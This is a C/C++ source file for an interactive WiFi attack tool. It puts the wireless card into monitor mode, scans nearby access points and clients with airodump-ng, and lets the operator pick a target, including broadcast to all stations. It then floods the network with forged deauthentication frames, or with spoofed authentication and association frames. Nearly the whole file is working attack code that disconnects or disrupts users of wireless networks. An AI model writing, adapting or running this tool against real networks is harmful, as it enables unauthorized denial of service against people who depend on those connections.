#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "deauth.h"
#include "mac.h"
#include "auth.h"
#include "assoc.h"

pthread_t p_thread[3];
pthread_attr_t attr;
int thr_id;
int status;

bool deauth = false;
bool auth = false;

char dev[10];
int apnum, stnum;
int check = 0, check2 = 0;

struct apinfo {
    char bssid[20];
    int channel;
    char essid[30];
};

struct apinfo alist[200];

struct stinfo {
    char smac[50];
    char bssid[50];
    char essid[50];
};

struct stinfo slist[200];

void parse_dev()
{
    char buf[60];

    FILE *fp = popen("sudo iw dev", "r");
    if (fp == NULL)
    {
        perror("erro : ");
        exit(0);
    }

    char word[] = "Interface";
    char* ptr = nullptr;

    int i=0;

    if (fp != NULL) {
        while ( !feof(fp) ) {
            fgets(buf, sizeof(buf), fp);
            ptr = strstr(buf, word);
            if (ptr != NULL) break;
        }
    }

    pclose(fp);

    strcpy(dev,  ptr+10);

    while (1) {

        if (dev[i] == '\n') {
            dev[i] = 0;
            break;
        }
        i++;
    }
}

void* scan_wifi(void* )
{
    check++;

    if (check >= 1) system("sudo rm -f ./parsed_airodump-01.csv");

    char buf[100];

    snprintf(buf, sizeof(buf), "sudo ifconfig %s down", dev);
    system(buf);

    snprintf(buf, sizeof(buf), "sudo iwconfig %s mode monitor", dev);
    system(buf);

    snprintf(buf, sizeof(buf), "sudo ifconfig %s up", dev);
    system(buf);

    //??
    snprintf(buf, sizeof(buf), "sudo iwconfig %s channel 1", dev);
    system(buf);

    snprintf(buf, sizeof(buf), "sudo xterm -e airodump-ng %s --write parsed_airodump --output-format csv", dev);
    system(buf);

}

void stop_scanning()
{
    system("sudo pkill airodump-ng");
}


int select_station()
{
    char buf[200];

    char smac[20], bssid[20], essid[50];

    int i=1, j, k=1, num;

    FILE *fp = fopen("./parsed_airodump-01.csv", "r");
    if( fp != NULL )
        {
            while( !feof( fp ) ){

                fgets( buf, sizeof(buf), fp );
                sscanf(buf, "%[^,], %*[^,], %*[^,], %*[^,], %*[^,], "
                               "%[^,], %[^,]",
                       smac, bssid, essid);
                if (essid[0] == 0) continue;
                if (strcmp(smac, "Station MAC") == 0) check2 = 1;
                if (check2 == 1) {
                    for (j=0;;j++) {
                        if (essid[j] == '\n' || essid[j] == '\r') {
                            essid[j] = 0;
                            break;
                        }
                    }
                    if (strcmp(essid, alist[apnum].essid) == 0 ||
                        strcmp(bssid, alist[apnum].bssid) == 0) {
                        strcpy(slist[i].smac, smac);
                        strcpy(slist[i].bssid, bssid);
                        strcpy(slist[i].essid, essid);
                        i++;
                    }
                }
                strcpy(smac, "");
                strcpy(bssid, "");
                strcpy(essid, "");
            }
            strcpy(slist[i].smac, "ff:ff:ff:ff:ff:ff");
    }

    printf("\n\nSelect station to attack: \n\n");

    for (k=1; k<i; k++) {
            printf("%d. \t", k);
            printf("%s\n", slist[k].smac);
    }
    printf("%d. \tall station", k);
    printf("\n\nchoose: ");
    scanf("%d", &num);
    return(num);


}

int select_ap()
{
    char buf[200];

    char bssid[20], essid[50];
    int channel;

    int i=1, j, num;

    FILE *fp = fopen("./parsed_airodump-01.csv", "r");
    if( fp != NULL )
        {
            while( !feof( fp ) ){

                fgets( buf, sizeof(buf), fp );
                sscanf(buf, "%[^,], %*[^,], %*[^,], %d, %*d, %*[^,], %*[^,], "
                               "%*[^,], %*d, %*d, %*d, %*[^,], %*d, %[^,]",
                       bssid, &channel, essid);
                if (essid[0] == 0) continue;
                strcpy(alist[i].bssid, bssid);
                alist[i].channel = channel;
                strcpy(alist[i].essid, essid);
                i++;

                strcpy(bssid, "");
                strcpy(essid, "");

            }
        }

    printf("\n\nSelect AP:\n\n");
    for (j=1; j<i; j++) {
//??
        printf("%d. \t", j);
        if (strlen(alist[j].essid) <= 6) {
            //printf("%d", strlen(alist[j].essid));
            printf("%s\t\t\t\t\t", alist[j].essid);
            printf("%20s\n\n", alist[j].bssid);
        }
        else if (strlen(alist[j].essid) > 6 && strlen(alist[j].essid) < 16) {
            printf("%s\t\t\t\t", alist[j].essid);
            printf("%20s\n\n", alist[j].bssid);
        }
        else {
            printf("%s\t\t", alist[j].essid);
            printf("%20s\n\n", alist[j].bssid);
        }
    }

    printf("\n\nchoose: ");
    scanf("%d", &num);
    return(num);
}


void* send_authpacket(void* )
{
    char buf[50];

    char* apmac = alist[apnum].bssid;
    char* stmac = slist[stnum].smac;
    int channel = alist[apnum].channel;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        exit(0);
    }

    struct authpacket authpacket;

    authpacket.radio.version = 0x00;
    authpacket.radio.pad = 0x00;
    authpacket.radio.len = 0x08;
    authpacket.radio.present = 0x00;
    authpacket.auth.fc = 0xb0;
    authpacket.auth.dur = 0x00;
    authpacket.auth.seq = 0x00;
    authpacket.auth.dest = Mac(apmac);
    authpacket.auth.source = Mac(stmac);
    authpacket.auth.bssid = Mac(apmac);
    authpacket.wireless.auth_algorithm = 0x00;
    authpacket.wireless.auth_seq = 0x01;
    authpacket.wireless.status = 0x00;
    authpacket.wireless.tag_num = 0xdd;
    authpacket.wireless.tag_len = 0x09;
    uint8_t oui[3] = {0x00, 0x10, 0x18};
    memcpy(authpacket.wireless.oui, oui, 3);
    uint8_t vendor[6] = {0x02, 0x00, 0x00, 0x10, 0x00, 0x00};
    memcpy(authpacket.wireless.vendor, vendor, 6);

    struct assocpacket assocpacket;

    assocpacket.radio.version = 0x00;
    assocpacket.radio.pad = 0x00;
    assocpacket.radio.len = 0x08;
    assocpacket.radio.present = 0x00;
    assocpacket.assoc.fc = 0x01;
    assocpacket.assoc.dur = 0x00;
    assocpacket.assoc.seq = 0x00;
    assocpacket.assoc.dest = Mac(apmac);
    assocpacket.assoc.source = Mac(stmac);
    assocpacket.assoc.bssid = Mac(apmac);
    assocpacket.wireles.cap = 0x00;
    assocpacket.wireles.li = 0x00;
    uint8_t ssid[2] = {0x00,};
    memcpy(assocpacket.wireles.ssid, ssid, 2);

    snprintf(buf, sizeof(buf), "iwconfig %s channel %d", dev, channel);
    system(buf);

    while (auth) {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&authpacket), sizeof(authpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                break;
            }
            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&assocpacket), sizeof(assocpacket));
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                break;
            }
            usleep(3906);
    }

    pcap_close(handle);
    pthread_exit((void *)0);
}


void* send_deauthpacket(void* )
{   
    char buf[50];

    char* apmac = alist[apnum].bssid;
    char* stmac = slist[stnum].smac;
    int channel = alist[apnum].channel;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        exit(0);
    }

    struct deauthpacket deauthpacket;

    deauthpacket.radio.version = 0x00;
    deauthpacket.radio.pad = 0x00;
    deauthpacket.radio.len = 0x08;
    deauthpacket.radio.present = 0x00;
    deauthpacket.deauth.fc = 0xc0;
    deauthpacket.deauth.dur = 0x00;
    deauthpacket.deauth.seq = 0x00;
    deauthpacket.wireless.reason = 0x00;

    deauthpacket.deauth.dest = Mac(stmac);
    deauthpacket.deauth.source = Mac(apmac);
    deauthpacket.deauth.bssid = Mac(apmac);

    snprintf(buf, sizeof(buf), "iwconfig %s channel %d", dev, channel);
    system(buf);

    while (deauth) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauthpacket), sizeof(deauthpacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        usleep(3906);
    }
    pcap_close(handle);
    pthread_exit((void *)0);
}

void menu()
{
    int num, num2, num3;

    while (1) {
        system("clear");
        printf("\n\n1. Scan WiFi\n\n");
        printf("2. Stop to scan\n\n");
        printf("3. attack\n\n");
        printf("4. exit\n");
        printf("\nchoose: ");
        scanf("%d", &num);

        if (num == 1)
        {
            pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
            thr_id = pthread_create(&p_thread[0], &attr, scan_wifi, NULL);
            if (thr_id < 0)
            {
                perror("thread create error : ");
                exit(0);
            }
        }
        if (num == 2) stop_scanning();
        if (num == 3)
        {
            system("clear");
            printf("\n\n\n[attack]");
            printf("\n\n1. auth-attack");
            printf("  2. deauth-attack");
            printf("  3. exit");
            printf("\n\nchoose: ");
            scanf("%d", &num2);

            if (num2 == 3) menu();

            apnum = select_ap();
            stnum = select_station();

            while (1)
            {
                printf("\n\n1. start");
                printf("  2. stop");
                printf("  3. exit");
                printf("\n\nchoose: ");
                scanf("%d", &num3);

                if (num2 == 1 && num3 == 1) {
                    auth = true;

                    thr_id = pthread_create(&p_thread[1], NULL, send_authpacket, NULL);
                    if (thr_id < 0)
                    {
                        perror("thread create error : ");
                        exit(0);
                    }
                }
                if (num2 == 1 && num3 == 2) {
                    auth = false;
                    pthread_join(p_thread[1], (void **)&status);
                }

                if (num2 == 2 && num3 == 1) {
                    deauth = true;
                    thr_id = pthread_create(&p_thread[2], NULL, send_deauthpacket, NULL);
                    if (thr_id < 0)
                    {
                        perror("thread create error : ");
                        exit(0);
                    }
                }
                if (num2 == 2 && num3 == 2) {
                    deauth = false;
                    pthread_join(p_thread[2], (void **)&status);
                }

                if (num3 == 3) break;
            }
        }
        if (num == 4) break;
    }
}

int main()
{
    parse_dev();
    menu();
    return 0;
}
